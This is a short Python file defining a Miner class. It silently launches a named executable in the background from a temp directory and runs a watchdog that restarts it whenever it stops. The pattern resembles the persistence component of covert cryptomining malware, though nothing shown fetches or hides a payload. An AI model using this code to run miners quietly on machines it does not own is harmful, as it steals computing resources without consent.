import time
import os
import psutil
from lib.TempManager import TempManager


class Miner:
    def __init__(self, exe_name:str):
        self.exe_name = exe_name
    

    def get_process(self):
        for proc in psutil.process_iter():
            try:
                if proc.name() == self.exe_name:
                    return proc
            except psutil.AccessDenied:
                pass

    def _start_miner(self):
        cwd = os.getcwd()
        os.chdir(TempManager.TEMPDIR)

        os.system(f"start /B {self.exe_name} > NUL")

        os.chdir(cwd)

        return self.get_process()


    def watchdog(self, poll_interval:float = 0.5):
        miner = self.get_process()

        while True:
            if miner is None or not miner.is_running():
                miner = self._start_miner()
        
            time.sleep(poll_interval)